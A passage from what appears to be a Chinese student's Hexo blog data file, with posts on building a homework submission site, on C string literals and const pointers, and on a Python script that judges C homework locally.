title=\"后端处理逻辑重构\"></a>后端处理逻辑重构</h2><p>一开始我是设置先新建（姓名+学号）的一个目录，再逐个文件进行判断，若符合条件则放进目录里，但这就会引发一个问题，如果有文件不符合条件的话目录仍会存在，而为了防止有意或是无意的重复上传导致原文件被覆盖，我又设置了若目录已存在则不能继续放文件,于是我在上机课的时候改成了先全部验证通过再上传目录。</p>\n<h2 id=\"管理员端\"><a href=\"#管理员端\" class=\"headerlink\" title=\"管理员端\"></a>管理员端</h2><p>毕竟作业也不是我收的，如果每次都要我来登录服务器下载未免也太过麻烦，于是我抄了段多级目录压缩的代码，在管理员通过验证后将提交上的作业打包成了个 zip ，再存储于基于 SHA256 算法生成的时间哈希值命名的目录中，这样大概便无法被直接扫描出来了。<br>管理员的登录验证我采用的是RSA公钥加密出的一段 base64 编码的字符串，若在后端用私钥解密后得到明文”admin”便通过验证，但想了想似乎没必要用非对称加密，有空再改。<br>除此之外，我还加了个验证码，但是在 Firefox 上似乎不能正常刷新，于是就没加在学生端了。</p>\n<h2 id=\"前端的样式\"><a href=\"#前端的样式\" class=\"headerlink\" title=\"前端的样式\"></a>前端的样式</h2><p>这个是我最无奈的地方，个人的美术功底着实是捞得亚匹，布局和配色搞得乱七八糟，在此就希望同学多多与我反馈了。</p>\n<h2 id=\"一些问题\"><a href=\"#一些问题\" class=\"headerlink\" title=\"一些问题\"></a>一些问题</h2><h3 id=\"开源\"><a href=\"#开源\" class=\"headerlink\" title=\"开源\"></a>开源</h3><p>本来打算上传到 github 的，但是还没处理好重要文件的放置（总不能学号和姓名也开源不是）。</p>\n<blockquote>\n<p><em>更新：项目已发布于</em><br><em><a href=\"https://github.com/weyung/A-simple-homework-submission-platform\">https://github.com/weyung/A-simple-homework-submission-platform</a></em></p>\n</blockquote>\n<h3 id=\"JQuery\"><a href=\"#JQuery\" class=\"headerlink\" title=\"JQuery\"></a>JQuery</h3><p>说来有些可笑，我一开始是用原生 Javescript 写的前端，代码繁琐且在使用 ajax 的时候被异步坑了一把：我写了一个函数调用后端的接口然后 return 数据，却发现主函数中得到的结果总是 undefined ，后来才知道是先 return 再接收数据，晕。而用 JQuery 一个回调函数就搞定了，虽然 JQuery 似乎的确有些过时，但有空再看 React、Vue 什么的吧。</p>\n<h3 id=\"SSH\"><a href=\"#SSH\" class=\"headerlink\" title=\"SSH\"></a>SSH</h3><p>之前是想用 VSCode 写代码的，但是 SSH 一直显示什么管道不存在，直到今晚才瞎搞接通了。用宝塔的在线文本编辑器写了一个星期的代码，现在终于能有舒服点的高亮了。至于调试也是个问题，因为懒得搭本地环境，我至今还是肉眼调试，有空也得处理下。</p>"},{"title":"变量指针指向的常量","date":"2021-12-30T14:21:53.000Z","_content":"\n关于 `char *s=\"ABCDE\"` 为什么是有问题的\n<!--more-->\n********************************\n\n## 前言\n\n之所以会注意到这个问题，是因为老师布置的课堂小测的一道题，原题如下：\n> 下面能正确进行字符串赋值操作的是____。\n> A. `char s[5]={\"ABCDE\"}`;\n> B. `char s[5]={'A','B','C','D','E'}`;\n> C. `char *s;s=\"ABCDE\"`;\n> D. `char *s;scanf(\"%s\",s)`;\n\n当看到答案选 B 的时候，我人傻了，~~因为我上网查的答案是C~~，纳闷着调试，结果如下：\n> B 选项的做法不会在后面补零终止符`'\\0'`，此时执行`printf(\"%s\",s);`会打印出ABCDE后面跟着一串乱码。\n> C 选项的做法会在后面补零终止符，且编译器编译不报错，运行同样不报错。\n\n此时的我更加疑惑，B 选项这不是有问题了吗？询问老师，老师给出的解释是：\n\n> 题干说进行**字符串赋值操作**，而 C 选项是给**指针赋值**\n\n~~这个解释离大谱~~。\n\n后来在 GZTime 及 Hanmur 学长的~~无语~~点拨下，我注意到了 C 选项的一个问题。\n\n## 常量指针与变量指针\n\n首先先引入常量指针与变量指针的概念，顾名思义，变量指针就是指向变量的指针，如：\n\n```C\nint a=0;\nint *p=&a;\n```\n\n此时 `a` 是一个变量， `p` 则是一个指向变量 `a` 的指针，即为变量指针。\n而同理，常量指针是一个指向常量的指针，如：\n\n```C\nconst int a=0;\nconst int *p=&a;\n```\n\n此时 `a` 是一个常量， `p` 是一个指向常量 `a` 的指针，即为常量指针。\n**注意：** 常量指针的声明格式为 `数据类型 const * 指针变量` 或者  `const 数据类型 *指针变量。`\n\n## 变量还是常量？\n\n那么问题来了，`char *s=\"ABCDE\"`一句中， `s` 指向的字符串是常量还是变量？\n一个很简单的区分方式是，尝试改变字符串的字符。\n\n```C\n    char t[]=\"ABCDE\";\n    t[0] = 'F';\n    char *s=\"ABCDE\";\n    s[0]='F';\n```\n\n运行结果是：前两句可以正常执行，而执行第 4 句时则会弹出 **Segmentation fault**。\n对程序进行分析可以知道，`char *s=\"ABCDE\";`一句会把字符串存储到**只读**的 `rdata` 段，所以无法改变其中的内容。\n也就是说，`char *s=\"ABCDE\"`一句中，**s 指向的字符串是常量**。\n\n## 总结\n\n那么回到开始的问题，`char *s=\"ABCDE\";` 为什么是错的\n答案是，**它用一个变量指针指向了一个常量**！\n正确的写法应为：\n`const char *s=\"ABCDE\";`\n也许当你编译时不会报错，甚至运行时不去改变里面的值时也不会发生中断，但这个语句的的确确是有问题的。\n","source":"_posts/变量指针指向的常量.md","raw":"---\ntitle: 变量指针指向的常量\ndate: 2021-12-30 22:21:53\ntags: C\ncategories: C语言\n---\n\n关于 `char *s=\"ABCDE\"` 为什么是有问题的\n<!--more-->\n********************************\n\n## 前言\n\n之所以会注意到这个问题，是因为老师布置的课堂小测的一道题，原题如下：\n> 下面能正确进行字符串赋值操作的是____。\n> A. `char s[5]={\"ABCDE\"}`;\n> B. `char s[5]={'A','B','C','D','E'}`;\n> C. `char *s;s=\"ABCDE\"`;\n> D. `char *s;scanf(\"%s\",s)`;\n\n当看到答案选 B 的时候，我人傻了，~~因为我上网查的答案是C~~，纳闷着调试，结果如下：\n> B 选项的做法不会在后面补零终止符`'\\0'`，此时执行`printf(\"%s\",s);`会打印出ABCDE后面跟着一串乱码。\n> C 选项的做法会在后面补零终止符，且编译器编译不报错，运行同样不报错。\n\n此时的我更加疑惑，B 选项这不是有问题了吗？询问老师，老师给出的解释是：\n\n> 题干说进行**字符串赋值操作**，而 C 选项是给**指针赋值**\n\n~~这个解释离大谱~~。\n\n后来在 GZTime 及 Hanmur 学长的~~无语~~点拨下，我注意到了 C 选项的一个问题。\n\n## 常量指针与变量指针\n\n首先先引入常量指针与变量指针的概念，顾名思义，变量指针就是指向变量的指针，如：\n\n```C\nint a=0;\nint *p=&a;\n```\n\n此时 `a` 是一个变量， `p` 则是一个指向变量 `a` 的指针，即为变量指针。\n而同理，常量指针是一个指向常量的指针，如：\n\n```C\nconst int a=0;\nconst int *p=&a;\n```\n\n此时 `a` 是一个常量， `p` 是一个指向常量 `a` 的指针，即为常量指针。\n**注意：** 常量指针的声明格式为 `数据类型 const * 指针变量` 或者  `const 数据类型 *指针变量。`\n\n## 变量还是常量？\n\n那么问题来了，`char *s=\"ABCDE\"`一句中， `s` 指向的字符串是常量还是变量？\n一个很简单的区分方式是，尝试改变字符串的字符。\n\n```C\n    char t[]=\"ABCDE\";\n    t[0] = 'F';\n    char *s=\"ABCDE\";\n    s[0]='F';\n```\n\n运行结果是：前两句可以正常执行，而执行第 4 句时则会弹出 **Segmentation fault**。\n对程序进行分析可以知道，`char *s=\"ABCDE\";`一句会把字符串存储到**只读**的 `rdata` 段，所以无法改变其中的内容。\n也就是说，`char *s=\"ABCDE\"`一句中，**s 指向的字符串是常量**。\n\n## 总结\n\n那么回到开始的问题，`char *s=\"ABCDE\";` 为什么是错的\n答案是，**它用一个变量指针指向了一个常量**！\n正确的写法应为：\n`const char *s=\"ABCDE\";`\n也许当你编译时不会报错，甚至运行时不去改变里面的值时也不会发生中断，但这个语句的的确确是有问题的。\n","slug":"变量指针指向的常量","published":1,"updated":"2024-06-05T07:53:58.179Z","_id":"cl8wgpppa0013ck6gcymkf7la","comments":1,"layout":"post","photos":[],"content":"<p>关于 <code>char *s=&quot;ABCDE&quot;</code> 为什么是有问题的</p>\n<span id=\"more\"></span>\n<hr>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>之所以会注意到这个问题，是因为老师布置的课堂小测的一道题，原题如下：</p>\n<blockquote>\n<p>下面能正确进行字符串赋值操作的是____。<br>A. <code>char s[5]=&#123;&quot;ABCDE&quot;&#125;</code>;<br>B. <code>char s[5]=&#123;&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;&#125;</code>;<br>C. <code>char *s;s=&quot;ABCDE&quot;</code>;<br>D. <code>char *s;scanf(&quot;%s&quot;,s)</code>;</p>\n</blockquote>\n<p>当看到答案选 B 的时候，我人傻了，<del>因为我上网查的答案是C</del>，纳闷着调试，结果如下：</p>\n<blockquote>\n<p>B 选项的做法不会在后面补零终止符<code>&#39;\\0&#39;</code>，此时执行<code>printf(&quot;%s&quot;,s);</code>会打印出ABCDE后面跟着一串乱码。<br>C 选项的做法会在后面补零终止符，且编译器编译不报错，运行同样不报错。</p>\n</blockquote>\n<p>此时的我更加疑惑，B 选项这不是有问题了吗？询问老师，老师给出的解释是：</p>\n<blockquote>\n<p>题干说进行<strong>字符串赋值操作</strong>，而 C 选项是给<strong>指针赋值</strong></p>\n</blockquote>\n<p><del>这个解释离大谱</del>。</p>\n<p>后来在 GZTime 及 Hanmur 学长的<del>无语</del>点拨下，我注意到了 C 选项的一个问题。</p>\n<h2 id=\"常量指针与变量指针\"><a href=\"#常量指针与变量指针\" class=\"headerlink\" title=\"常量指针与变量指针\"></a>常量指针与变量指针</h2><p>首先先引入常量指针与变量指针的概念，顾名思义，变量指针就是指向变量的指针，如：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> a=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> *p=&amp;a;</span><br></pre></td></tr></table></figure>\n\n<p>此时 <code>a</code> 是一个变量， <code>p</code> 则是一个指向变量 <code>a</code> 的指针，即为变量指针。<br>而同理，常量指针是一个指向常量的指针，如：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">int</span> a=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">int</span> *p=&amp;a;</span><br></pre></td></tr></table></figure>\n\n<p>此时 <code>a</code> 是一个常量， <code>p</code> 是一个指向常量 <code>a</code> 的指针，即为常量指针。<br><strong>注意：</strong> 常量指针的声明格式为 <code>数据类型 const * 指针变量</code> 或者  <code>const 数据类型 *指针变量。</code></p>\n<h2 id=\"变量还是常量？\"><a href=\"#变量还是常量？\" class=\"headerlink\" title=\"变量还是常量？\"></a>变量还是常量？</h2><p>那么问题来了，<code>char *s=&quot;ABCDE&quot;</code>一句中， <code>s</code> 指向的字符串是常量还是变量？<br>一个很简单的区分方式是，尝试改变字符串的字符。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> t[]=<span class=\"string\">&quot;ABCDE&quot;</span>;</span><br><span class=\"line\">t[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;F&#x27;</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> *s=<span class=\"string\">&quot;ABCDE&quot;</span>;</span><br><span class=\"line\">s[<span class=\"number\">0</span>]=<span class=\"string\">&#x27;F&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>运行结果是：前两句可以正常执行，而执行第 4 句时则会弹出 <strong>Segmentation fault</strong>。<br>对程序进行分析可以知道，<code>char *s=&quot;ABCDE&quot;;</code>一句会把字符串存储到<strong>只读</strong>的 <code>rdata</code> 段，所以无法改变其中的内容。<br>也就是说，<code>char *s=&quot;ABCDE&quot;</code>一句中，<strong>s 指向的字符串是常量</strong>。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>那么回到开始的问题，<code>char *s=&quot;ABCDE&quot;;</code> 为什么是错的<br>答案是，<strong>它用一个变量指针指向了一个常量</strong>！<br>正确的写法应为：<br><code>const char *s=&quot;ABCDE&quot;;</code><br>也许当你编译时不会报错，甚至运行时不去改变里面的值时也不会发生中断，但这个语句的的确确是有问题的。</p>\n","excerpt":"<p>关于 <code>char *s=&quot;ABCDE&quot;</code> 为什么是有问题的</p>","more":"<hr>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>之所以会注意到这个问题，是因为老师布置的课堂小测的一道题，原题如下：</p>\n<blockquote>\n<p>下面能正确进行字符串赋值操作的是____。<br>A. <code>char s[5]=&#123;&quot;ABCDE&quot;&#125;</code>;<br>B. <code>char s[5]=&#123;&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;&#125;</code>;<br>C. <code>char *s;s=&quot;ABCDE&quot;</code>;<br>D. <code>char *s;scanf(&quot;%s&quot;,s)</code>;</p>\n</blockquote>\n<p>当看到答案选 B 的时候，我人傻了，<del>因为我上网查的答案是C</del>，纳闷着调试，结果如下：</p>\n<blockquote>\n<p>B 选项的做法不会在后面补零终止符<code>&#39;\\0&#39;</code>，此时执行<code>printf(&quot;%s&quot;,s);</code>会打印出ABCDE后面跟着一串乱码。<br>C 选项的做法会在后面补零终止符，且编译器编译不报错，运行同样不报错。</p>\n</blockquote>\n<p>此时的我更加疑惑，B 选项这不是有问题了吗？询问老师，老师给出的解释是：</p>\n<blockquote>\n<p>题干说进行<strong>字符串赋值操作</strong>，而 C 选项是给<strong>指针赋值</strong></p>\n</blockquote>\n<p><del>这个解释离大谱</del>。</p>\n<p>后来在 GZTime 及 Hanmur 学长的<del>无语</del>点拨下，我注意到了 C 选项的一个问题。</p>\n<h2 id=\"常量指针与变量指针\"><a href=\"#常量指针与变量指针\" class=\"headerlink\" title=\"常量指针与变量指针\"></a>常量指针与变量指针</h2><p>首先先引入常量指针与变量指针的概念，顾名思义，变量指针就是指向变量的指针，如：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> a=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> *p=&amp;a;</span><br></pre></td></tr></table></figure>\n\n<p>此时 <code>a</code> 是一个变量， <code>p</code> 则是一个指向变量 <code>a</code> 的指针，即为变量指针。<br>而同理，常量指针是一个指向常量的指针，如：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">int</span> a=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">int</span> *p=&amp;a;</span><br></pre></td></tr></table></figure>\n\n<p>此时 <code>a</code> 是一个常量， <code>p</code> 是一个指向常量 <code>a</code> 的指针，即为常量指针。<br><strong>注意：</strong> 常量指针的声明格式为 <code>数据类型 const * 指针变量</code> 或者  <code>const 数据类型 *指针变量。</code></p>\n<h2 id=\"变量还是常量？\"><a href=\"#变量还是常量？\" class=\"headerlink\" title=\"变量还是常量？\"></a>变量还是常量？</h2><p>那么问题来了，<code>char *s=&quot;ABCDE&quot;</code>一句中， <code>s</code> 指向的字符串是常量还是变量？<br>一个很简单的区分方式是，尝试改变字符串的字符。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> t[]=<span class=\"string\">&quot;ABCDE&quot;</span>;</span><br><span class=\"line\">t[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;F&#x27;</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> *s=<span class=\"string\">&quot;ABCDE&quot;</span>;</span><br><span class=\"line\">s[<span class=\"number\">0</span>]=<span class=\"string\">&#x27;F&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>运行结果是：前两句可以正常执行，而执行第 4 句时则会弹出 <strong>Segmentation fault</strong>。<br>对程序进行分析可以知道，<code>char *s=&quot;ABCDE&quot;;</code>一句会把字符串存储到<strong>只读</strong>的 <code>rdata</code> 段，所以无法改变其中的内容。<br>也就是说，<code>char *s=&quot;ABCDE&quot;</code>一句中，<strong>s 指向的字符串是常量</strong>。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>那么回到开始的问题，<code>char *s=&quot;ABCDE&quot;;</code> 为什么是错的<br>答案是，<strong>它用一个变量指针指向了一个常量</strong>！<br>正确的写法应为：<br><code>const char *s=&quot;ABCDE&quot;;</code><br>也许当你编译时不会报错，甚至运行时不去改变里面的值时也不会发生中断，但这个语句的的确确是有问题的。</p>"},{"title":"一个简单的本地判题脚本","date":"2021-12-28T14:28:38.000Z","_content":"\n在做程序设计作业的时候，题目经常是要输入 10 个数字，但用不起 Matrix 的我只能手动输入，不但麻烦，而且也很难模拟随机过程，想过做一个 OJ （在线判题平台），但又苦于不会用 Docker ，思来想去，就用 Python 写了个本地判题脚本，虽然还不能防恶意代码，也无法实现内存检查，但基本的输入输出还是能够做到，供君一乐。\n<!--more-->\n********************************\n\n## 源码\n\n### Windows下\n\n鉴于本人是追求实用（能跑就行），同理猜测读者也不关心这到底怎么实现，或者说不着急关心，于是直接附上 Windows 环境下的 Python 源码，开盒即用，只需要你有一点 Python 的基础，会装 subprocess 和 tqdm 库就行，然后在脚本所在的目录新建一个名为`标准代码`的文件夹，并在里面放入一个`std.c`作为测试输出的基准参照，同理新建一个`测试代码`的文件夹并放入`test.c`作为被测试的代码，**同时安装好gcc**，运行脚本，就能大功告成了。\n\n```python\nimport subprocess\nimport random\nimport sys\nfrom tqdm import tqdm\n\ndef random_int_list(start, stop, length):\n    start, stop = (int(start), int(stop)) if start <= stop else (\n        int(stop), int(start))\n    length = int(abs(length)) if length else 0\n    random_list = []\n    for i in range(length):\n        random_list.append(random.randint(start, stop))\n    return random_list\n\ndef iotest(filename, path, data):\n    obj = subprocess.Popen([filename], stdin=subprocess.PIPE,\n                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=path, encoding=\"utf-8\",shell=True)\n    obj.stdin.write(data)\n    out_info, out_error = obj.communicate()  # 简单写法，out_info：标准输出\n    # print(out_info,out_error)\n    return out_info\n\nif __name__ == '__main__':\n    stdpath = \"%s\\\\标准代码\\\\\" % sys.path[0]      # 标准代码所在路径\n    testpath = \"%s\\\\测试代码\\\\\" % sys.path[0]     # 测试代码所有路径\n    #编译标准及测试代码\n    result = subprocess.check_output(\"gcc -std=c99 -o std std.c\", shell=True, cwd=stdpath)\n    result = subprocess.check_output(\"gcc -std=c99 -o test test.c\", shell=True, cwd=testpath)\n\n    f = open('%s\\测试结果.txt' % sys.path[0], 'w+', encoding='utf-8', newline=\"\")\n    print('随机测试中...')\n    pas=0       # 通过次数\n    freq=10    # 测试次数\n    for index in tqdm(range(freq)):\n        # 生成测试数据\n        rtest = random_int_list(0, 99, 10)\n        s = ''\n        for i in rtest:\n            s = \"%s%s \" % (s, i)\n        s = \"%s\\n\" % s\n        # 进行测试\n        output = iotest(\".\\\\test.exe\", testpath, s)\n        stdoutput = iotest(\".\\\\std.exe\", stdpath, s)\n        f.write(\"随机测试 - r,%d数据点\\n\"%index)\n        f.write(\"标准输入\\n%s\" % s)\n        f.write(\"实际输出\\n%s\\n\" % output)\n        f.write(\"期望输出\\n%s\\n\\n\" % stdoutput)\n        if output==stdoutput:\n            f.write('通过「随机测试 - r,%d数据点」测试点\\n\\n'%index)\n            pas=pas+1\n        else:\n            f.write('未通过「随机测试 - r,%d数据点」测试点\\n\\n'%index)\n    f.close()\n    print('随机测试 %d/%d'%(pas,freq))\n    print('测试完成')\n```\n\n同时附上样例标准代码：\n\n```C\n#include <stdio.h>\n#define N 10\nvoid inputarray(int *arr);\nvoid handlearray(int *arr);\nvoid outputarray(int *arr);\nvoid swap(int *p,int *q);\nint main()\n{\n    int array[N]= {0};\n    inputarray(array);\n    handlearray(array);\n    outputarray(array);\n    return 0;\n}\nvoid swap(int *p,int *q)\n{\n    int temp=*p;\n    *p=*q;\n    *q=temp;\n}\nvoid handlearray(int *arr)\n{\n    int *p=arr;\n    int max_index=0;\n    int min_index=0;\n    int max=arr[0];\n    int min=arr[0];\n    for(int i=1;i<N;i++)\n    {\n        if(*(p+i)>max)\n        {\n            max=*(p+i);\n            max_index=i;\n        }\n        if(*(p+i)<min)\n        {\n            min=*(p+i);\n            min_index=i;\n        }\n    }\n    swap((p+max_index),(p+9));\n    swap((p+min_index),(p+0));\n}\nvoid inputarray(int *arr)\n{\n    int *p=arr;\n    for(int i=0; i<N; i++)\n    {\n        scanf(\"%d\",(p+i));\n    }\n}\nvoid outputarray(int *arr)\n{\n    int *p=arr;\n    for(int i=0; i<N; i++)\n    {\n        printf(\"%d \",*(p+i));\n    }\n}\n```\n\n以及样例测试代码：\n\n```C\n#include <stdio.h>\nint main()\n{\n    void inv(int *x, int n);\n    int i, a[10];\n    for (i = 0; i < 10; i++)\n        scanf(\"%d\", &a[i]);\n    //printf(\"\\n\");\n    inv(a, 10);\n    //printf(\"The array has been inverted:\\n\");\n    for (i = 0; i < 10; i++)\n        printf(\"%d \", a[i]);\n    //printf(\"\\n\");\n    return 0;\n}\n\nvoid inv(int *x, int n)\n{\n    int *i, max, min, p, q, *c, *d;\n    max = *x;\n    min = *(x + 1);\n    c = x + 0;\n    d = x + 1;\n    for (i = x; i < x + 10; i++)\n        if (*i > max)\n        {\n            max = *i;\n            c = i;\n        }\n    for (i = x; i < x + 10; i++)\n        if (*i < min)\n        {\n            min = *i;\n            d = i;\n        }\n    p = *x;\n    *x = *d;\n    *d = p;\n    q = *(x + 9);\n    *(x + 9) = *c;\n    *c = q;\n}\n```\n\n### Linux 下的 Python 源码\n\n一个现象就是， Linux 下进行测试的速度明显比 Windows 下快，我测试的时候两者甚至相差 100 余倍，其中原因可留给读者细究。\n\n```python\nimport subprocess\nimport random\nimport sys\nfrom tqdm import tqdm\n\ndef random_int_list(start, stop, length):\n    start, stop = (int(start), int(stop)) if start <= stop else (\n        int(stop), int(start))\n    length = int(abs(length)) if length else 0\n    random_list = []\n    for i in range(length):\n        random_list.append(random.randint(start, stop))\n    return random_list\n\ndef iotest(filename, path, data):\n    obj = subprocess.Popen([filename], stdin=subprocess.PIPE,\n                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=path, encoding=\"utf-8\")\n    obj.stdin.write(data)\n    out_info, out_error = obj.communicate()  # 简单写法，out_info：标准输出\n    # print(out_info,out_error)\n    return out_info\n\nif __name__ == '__main__':\n    stdpath = \"%s/标准代码/\" % sys.path[0]      # 标准代码所在路径\n    testpath = \"%s/测试代码/\" % sys.path[0]     # 测试代码所有路径\n    #编译标准及测试代码\n    result = subprocess.check_output(\"gcc -std=c99 -o std std.c\", shell=True, cwd=stdpath)\n    result = subprocess.check_output(\"gcc -std=c99 -o test test.c\", shell=True, cwd=testpath)\n\n    f = open('%s/测试结果.txt' % sys.path[0], 'w+', encoding='utf-8', newline=\"\")\n    print('随机测试中...')\n    pas=0       # 通过次数\n    freq=100    # 测试次数\n    for index in tqdm(range(freq)):\n        # 生成测试数据\n        rtest = random_int_list(0, 99, 10)\n        s = ''\n        for i in rtest:\n            s = \"%s%s \" % (s, i)\n        s = \"%s\\n\" % s\n        # 进行测试\n        output = iotest(\"./test\", testpath, s)\n        stdoutput = iotest(\"./std\", stdpath, s)\n        f.write(\"随机测试 - r,%d数据点\\n\"%index)\n        f.write(\"标准输入\\n%s\" % s)\n        f.write(\"实际输出\\n%s\\n\" % output)\n        f.write(\"期望输出\\n%s\\n\\n\" % stdoutput)\n        if output==stdoutput:\n            f.write('通过「随机测试 - r,%d数据点」测试点\\n\\n'%index)\n            pas=pas+1\n        else:\n            f.write('未通过「随机测试 - r,%d数据点」测试点\\n\\n'%index)\n    f.close()\n    print('随机测试 %d/%d'%(pas,freq))\n    print('测试完成')\n```\n","source":"_posts/一个简单的本地判题脚本.md","raw":"---\ntitle: 一个简单的本地判题脚本\ndate: 2021-12-28 22:28:38\ntags: Python\ncategories: 小玩意\n---\n\n在做程序设计作业的时候，题目经常是要输入 10 个数字，但用不起 Matrix 的我只能手动输入，不但麻烦，而且也很难模拟随机过程，想过做一个 OJ （在线判题平台），但又苦于不会用 Docker ，思来想去，就用 Python 写了个本地判题脚本，虽然还不能防恶意代码，也无法实现内存检查，但基本的输入输出还是能够做到，供君一乐。\n<!--more-->\n********************************\n\n## 源码\n\n### Windows下\n\n鉴于本人是追求实用（能跑就行），同理猜测读者也不关心这到底怎么实现，或者说不着急关心，于是直接附上 Windows 环境下的 Python 源码，开盒即用，只需要你有一点 Python 的基础，会装 subprocess 和 tqdm 库就行，然后在脚本所在的目录新建一个名为`标准代码`的文件夹，并在里面放入一个`std.c`作为测试输出的基准参照，同理新建一个`测试代码`的文件夹并放入`test.c`作为被测试的代码，**同时安装好gcc**，运行脚本，就能大功告成了。\n\n```python\nimport subprocess\nimport random\nimport sys\nfrom tqdm import tqdm\n\ndef random_int_list(start, stop, length):\n    start, stop = (int(start), int(stop)) if start <= stop else (\n        int(stop), int(start))\n    length = int(abs(length)) if length else 0\n    random_list = []\n    for i in range(length):\n        random_list.append(random.randint(start, stop))\n    return random_list\n\ndef iotest(filename, path, data):\n    obj = subprocess.Popen([filename], stdin=subprocess.PIPE,\n                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=path, encoding=\"utf-8\",shell=True)\n    obj.stdin.write(data)\n    out_info, out_error = obj.communicate()  # 简单写法，out_info：标准输出\n    # print(out_info,out_error)\n    return out_info\n\nif __name__ == '__main__':\n    stdpath = \"%s\\\\标准代码\\\\\" % sys.path[0]      # 标准代码所在路径\n    testpath = \"%s\\\\测试代码\\\\\" % sys.path[0]     # 测试代码所有路径\n    #编译标准及测试代码\n    result = subprocess.check_output(\"gcc -std=c99 -o std std.c\", shell=True, cwd=stdpath)\n    result = subprocess.check_output(\"gcc -std=c99 -o test test.c\", shell=True, cwd=testpath)\n\n    f = open('%s\\测试结果.txt' % sys.path[0], 'w+', encoding='utf-8', newline=\"\")\n    print('随机测试中...')\n    pas=0       # 通过次数\n    freq=10    # 测试次数\n    for index in tqdm(range(freq)):\n        # 生成测试数据\n        rtest = random_int_list(0, 99, 10)\n        s = ''\n        for i in rtest:\n            s = \"%s%s \" % (s, i)\n        s = \"%s\\n\" % s\n        # 进行测试\n        output = iotest(\".\\\\test.exe\", testpath, s)\n        stdoutput = iotest(\".\\\\std.exe\", stdpath, s)\n        f.write(\"随机测试 - r,%d数据点\\n\"%index)\n        f.write(\"标准输入\\n%s\" % s)\n        f.write(\"实际输出\\n%s\\n\" % output)\n        f.write(\"期望输出\\n%s\\n\\n\" % stdoutput)\n        if output==stdoutput:\n            f.write('通过「随机测试 - r,%d数据点」测试点\\n\\n'%index)\n            pas=pas+1\n        else:\n            f.write('未通过「随机测试 - r,%d数据点」测试点\\n\\n'%index)\n    f.close()\n    print('随机测试 %d/%d'%(pas,freq))\n    print('测试完成')\n```\n\n同时附上样例标准代码：\n\n```C\n#include <stdio.h>\n#define N 10\nvoid inputarray(int *arr);\nvoid handlearray(int *arr);\nvoid outputarray(int *arr);\nvoid swap(int *p,int *q);\nint main()\n{\n    int array[N]= {0};\n    inputarray(array);\n    handlearray(array);\n    outputarray(array);\n    return 0;\n}\nvoid swap(int *p,int *q)\n{\n    int temp=*p;\n    *p=*q;\n    *q=temp;\n}\nvoid handlearray(int *arr)\n{\n    int *p=arr;\n    int max_index=0;\n    int min_index=0;\n    int max=arr[0];\n    int min=arr[0];\n    for(int i=1;i<N;i++)\n    {\n        if(*(p+i)>max)\n        {\n            max=*(p+i);\n            max_index=i;\n        }\n        if(*(p+i)<min)\n        {\n            min=*(p+i);\n            min_index=i;\n        }\n    }\n    swap((p+max_index),(p+9));\n    swap((p+min_index),(p+0));\n}\nvoid inputarray(int *arr)\n{\n    int *p=arr;\n    for(int i=0; i<N; i++)\n    {\n        scanf(\"%d\",(p+i));\n    }\n}\nvoid outputarray(int *arr)\n{\n    int *p=arr;\n    for(int i=0; i<N; i++)\n    {\n        printf(\"%d \",*(p+i));\n    }\n}\n```\n\n以及样例测试代码：\n\n```C\n#include <stdio.h>\nint main()\n{\n    void inv(int *x, int n);\n    int i, a[10];\n    for (i = 0; i < 10; i++)\n        scanf(\"%d\", &a[i]);\n    //printf(\"\\n\");\n    inv(a, 10);\n    //printf(\"The array has been inverted:\\n\");\n    for (i = 0; i < 10; i++)\n        printf(\"%d \", a[i]);\n    //printf(\"\\n\");\n    return 0;\n}\n\nvoid inv(int *x, int n)\n{\n    int *i, max, min, p, q, *c, *d;\n    max = *x;\n    min = *(x + 1);\n    c = x + 0;\n    d = x + 1;\n    for (i = x; i < x + 10; i++)\n        if (*i > max)\n        {\n            max = *i;\n            c = i;\n        }\n    for (i = x; i < x + 10; i++)\n        if (*i < min)\n        {\n            min = *i;\n            d = i;\n        